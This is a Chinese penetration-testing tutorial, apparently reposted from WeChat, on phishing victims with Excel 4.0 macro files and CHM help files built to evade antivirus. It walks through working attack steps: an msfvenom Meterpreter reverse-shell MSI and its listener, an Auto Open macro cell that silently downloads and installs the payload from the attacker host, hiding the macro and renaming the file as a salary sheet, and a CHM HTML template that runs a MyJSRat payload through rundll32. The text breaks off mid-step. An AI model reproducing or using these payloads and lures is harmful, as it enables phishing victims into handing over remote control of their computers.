---
title: 渗透测试之地基钓鱼篇：Excel宏和CHM电子书免杀钓鱼
url: https://buaq.net/go-135393.html
source: unSafe.sh - 不安全
date: 2022-11-14
fetch_date: 2025-10-03T22:39:53.833975
---

# 渗透测试之地基钓鱼篇：Excel宏和CHM电子书免杀钓鱼

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/97653b15ac6eacfbb98e17fae377214f.jpg)

渗透测试之地基钓鱼篇：Excel宏和CHM电子书免杀钓鱼

简介渗透测试-地基篇：该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。请注意：本文仅用于技术讨论与研究，对于所有笔记中复
*2022-11-13 09:15:21
Author: [mp.weixin.qq.com(查看原文)](/jump-135393.htm)
阅读量:35
收藏*

---

![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif)

## 简介

渗透测试-地基篇：

该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。

请注意：

本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

名言：

你对这行的兴趣，决定你在这行的成就！

## 一、前言

Excel一般指Microsoft Office Excel。这里就不用多说了，它跟office一样都是支持宏的，所以一样存在宏病毒。当我们把恶意的宏代码嵌入Excel中，用户打开Excel文件里的宏就会被触发，然后拿到对方电脑权限，并进行控制。

CHM是已编译的帮助文件，它是微软新一代的帮助文件格式，目前也是比较常见的一种文件了。

CHM的原理是支持Javascript、VBscript、ActiveX、JavaApplet、Flash、常见图形文件(GIF、JPEG、PNG)、音频视频文件(MID、WAV、AVI)等等，并可以通过URL 与Internet联系在一起，那么这里就可以利用这些支持的形式，在里面注入恶意代码，在恶意代码层面上在做个免杀。

.Chm文件格式是HTML文件格式的扩展，所以接下来演示的是如何利用恶意代码注入html文本中，并创建chm的说明文件，通过上传用户下载后执行，在攻击机上直接控制对方电脑。

## 二、环境介绍

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8mX0HLGZouIevEM3cN6MM4hvy1KzElZYxxk8L1d1wFBw9Le7f8T0kng/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

黑客（攻击者）：

IP：192.168.2.153

系统：kali.2020.4

VPS服务器：

例如搭建了各种破解软件平台，供客户需求下载！

钓鱼地址：http://xxxx.dayuixiyou.cn

办公电脑：

系统：windwos7

IP：192.168.2.144

目前黑客利用kali运行了MyJSRat外壳 ，通过制作Excel宏恶意后门和制作CHM电子文件说明书进行上传，并诱骗安全意识差人员进行需求下载，并获得对方电脑权限的演示过程！！

## 三、Excel宏躲避杀软检测

演示制作Excel是利用Excel 2016版本进行！

### 1、制作msi恶意文件

### ![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8MW67icdia1FPibbSF81Zfl7iaC5A4FsicOLmTXcoGf4SKaJ13U4V7aCmf2w/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

> msfvenom -p windows/meterpreter/reverse\_tcp lhost=192.168.2.153 lport=6666 -f msi -o dayu.msi

利用msfvenom生成msi恶意后门文件，这里还有很多方法可以生成msi，免杀也可以在这里开始进行！

### 2、建立监听

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8F9tABXCcQNqhmmx7gUeQwjBa0JXnzmiczcwScQGPp8gpico8b0UKhaog/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

> use exploit/multi/handler
>
> set payload windows/meterpreter/reverse\_tcp
>
> set lhost 192.168.2.153
>
> set lport 6666
>
> exploit -j #持续监听

这里创建好监听后，等待被钓鱼到的客户进行反弹shell即可！

### 3、模拟Vps开启服务

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8gfI7S8AmpPwF35zpnbV4743ISVLSS0RaQnRULnbg9nRDIUjOYMhPrA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

这里就假设kali是公网服务器，开启了apache后，将msi恶意文件上传到服务器....接下来就开始制作分离免杀的Excel恶意宏后门文件，我前面一片XSS文章利用Flash钓鱼也是利用了分离免杀效果，目前还是挺好用的！！最后我还会讲解到一些思路！！继续！！

### 4、制作Excel宏

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8BaWiaiaO3IAmgrvesW6dhoNiakxAU2sIrsjXqOG2D0b3nPM9vW4yNY71g/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

首先在windwos环境利用excle2016创建一个.xlsx的文件！可看时间也是最新操作演示的！

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8GTqrzq0cibSjia4v9lR5l39on6w4lZuyEv57jnxPAdRjyPCT7BicASYgA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

创建好后双击打开，并在左下角邮件点击sh...，然后点击插入！

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8qHNWZgo0pARh2tBmSOMg0YOmC8rCdB8XzvGXnXxxsFp4TGtibJ22dug/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

选择MS Excel 4.0宏表....

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8IEf6wAIDspzbOEicbBaeIGGpDRicoujvYrO7LiaAS9wFruavPRiaH3ZmcA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

然后在左上角第一个格子输入：

> =EXEC("msiexec /q /ihttp://192.168.2.153/dayu.msi") #调用执行服务器上的dayu.msi文件

第二个格子输入：

> =HALT()        标识Excel 4.0宏结束，类似C语言return指令

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8ROOwG0iat2QNSDGHcTQp8ic1Ha7KszWtKuQz5I1eRIHH9aibvfMMicX8Fw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

然后将左上角的A1模式手动输入：Auto Open，Enter回车即可！

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8rM5N9XCwxeFFNBPz3W6DLtypCbmuK03kMhSJvribsOhDT4BkbP1GkzQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

为了避免对方打开能看到宏文件，以及增强隐蔽性，将宏进行隐藏！

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8mZrdQyccgJEg3qANymNuOgDicibLII7f5wKTMurPj5XfQZ5ZtxJrNElw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

Ctrl+S保存后，出现该提示，按照该提示进行点击否！

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8y4OiabCT8RaHaW5NHL4FqEDDMspC0Sgv7ghgBdQNIAdEiapB9lbUTnwQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

然后选择创建名称为：.xlsm，并保存！

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8NmOz5icsfBEq1PEsbHAXr8rRUBCYNWAornarhtATJqEt1icTickIfpeMw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

可看到桌面上存在了两个文件...一个是纯文本，一个是xlsm恶意文件！

这里只需要修改下dayu-hong文件名，例如工资表等，对方很容易打开查看！

### 5、执行恶意宏并控制对方电脑

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8EZW722Rep5z8EAzDGCugO9VvD5Shz6jI4jQZR7sxNmrDNDSY2rRnzQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

可看到双击恶意宏文件后，提示宏被禁用了，需要启用内容！

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8sOSH1bPV19qV7BVfchEicSEwicsWhtEGCDoE4cbnD6qJsKBbqYKiaUvrA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

可看到被攻击方点击了启用宏内容后，黑客kali系统上MSF获得了反弹shell外壳！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8slB2P3E1rLnk3gaFevF0UicXvTuPgGVM41G5wSdch2oS7QAwU27jjuA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

获得外壳后进一步查看计算机信息，和IP地址信息，都是可以查看的，下一步就可以进行后渗透深入攻击了！！

## 四、CHM 电子书钓鱼

废话不多说，开始演示，该演示是2020.12.24进行最新操作的！

### 1、环境安装和介绍

项目地址：https://github.com/Ridter/MyJSRat

下载项目：git clone https://github.com/Ridter/MyJSRat

这个工具是用python2编写，脚本修改分为两个模式，交互模式以及执行命令模式。大多数情况使用交互模式，开始！

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8m8yeSgMHxTnIumracgKRmHvWHDMJrY3y0xVLia3V5hA44yibUvib4GOxw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

命令：git clone https://github.com/Ridter/MyJSRat

进行安装，成功安装好后的界面！

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8hDpz95lOUE7ujkQ280m27dNicUVypxS3HdBsgVerTTfB3kGZXYWLI8w/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

命令执行：python MyJSRat.py

可看到帮助信息，几个功能都有详细的解释！

### 2、生成恶意代码

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP89g6OKEn09nL8JhGhDLjvkPTGHSd1KPfwsz1Cn4ica3M3Z4CfYhAkrtw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

命令：

> python MyJSRat.py -i 192.168.2.153 -p 6666
>
> -i    指定IP地址
>
> -p    指定开放的端口

可看到获得了恶意代码地址：http://192.168.2.153:8888/wtf

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8f3k24vSM6DHzTib780pIqy9TOPiaEicANUVBf4PtLhGl5cHHickpaz7B9g/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

访问后即可看到恶意代码，等会就利用该恶意代码使用rundll32.exe进行反弹shell！！

### 3、制作CHM的恶意html文件

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8T10kicVSibfD2pHSxEDRP68nRrzQhZicEIAB4oprC04byxRIXMy1urxHw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

首先这里需要一段Html的payload，主要是对应chm格式导出的，这里可以在后面介绍的工具中查看到，或者在google都能找到，我这里也把我这段html提供给大家：

> <!DOCTYPE html><html><head><title>说明</title><head></head><body> <br>
>
> <OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1
>
> height=1>
>
> <PARAM name="Command" value="ShortCut">
>
> <PARAM name="Button" value="Bitmap::shortcut">
>
> <PARAM name="Item1" value=',这里是你的 payload'>
>
> <PARAM name="Item2" value="273,1,1">
>
> </OBJECT>
>
> <SCRIPT>
>
> x.Click();
>
> </SCRIPT>
>
> </body></html>

这里在本地创建一个dayu-chm...的文件夹，在文件夹内新建一个.txt文本，然后将以上代码复制进入！可看到中文提示，放入payload在该处即可！

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8GqxfMqfIiay9aqVDtdxgbSvMN9Se6T4OO0icOFQC5tKBMYtp9n9Pe2Ew/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

将MyJSRat.py生成的payload替换掉：这里是你的 payload！！！

然后由于需要在windwos环境中执行该文件，在html编码中，需要在exe和javascript添加一个英文格式的逗号即可！！否者无法执行！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/O7dWXt4o5KPu1xuBIRlibcyMYLGgqDIP8p98RXogt2IVsCh1TB4cichibmKJU4P8PkvbMCPr...